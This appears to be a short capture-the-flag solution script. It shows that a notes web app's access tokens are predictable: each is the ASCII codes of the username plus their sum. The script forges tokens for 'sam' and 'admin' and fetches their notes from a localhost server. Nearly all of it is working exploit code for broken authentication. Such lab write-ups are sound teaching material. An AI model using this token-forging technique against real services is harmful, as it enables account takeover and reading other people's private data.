# if you are an abolute h a c k e r m a n you'll notice that to tokens are predictable
# for a giver user, say 'sam', their access token is just a '-' separated list of numbers
# format as follows:
# s-a-m-X , where s,a,m are replaced with their ascii ordinate, and X replaced with sum(s,a,m)
# in this case yielding: 115-97-109-321
#                         s - a- m -sum

# you can do this easily on paper or with a cheeky python script:

def token_for_username(username):
    ord_str = '-'.join([str(ord(c)) for c in username])
    sum_ord = sum([ord(c) for c in username])
    token = ord_str + '-' + str(sum_ord)
    return token

print(token_for_username("admin"))

# so we can generate tokens for any user now, so you can look at all their notes if you know their username
import requests
host = 'localhost' # change to the current host

token_sam = token_for_username("sam")
notes_sam = requests.get("http://"+host+":5000/notes", params={'token':token_sam})
print(notes_sam.json())

# repeat for the admin user revealing the end of the challenge
token_admin = token_for_username("admin")
notes_admin = requests.get("http://"+host+":5000/notes", params={'token':token_admin})
print(notes_admin.json())
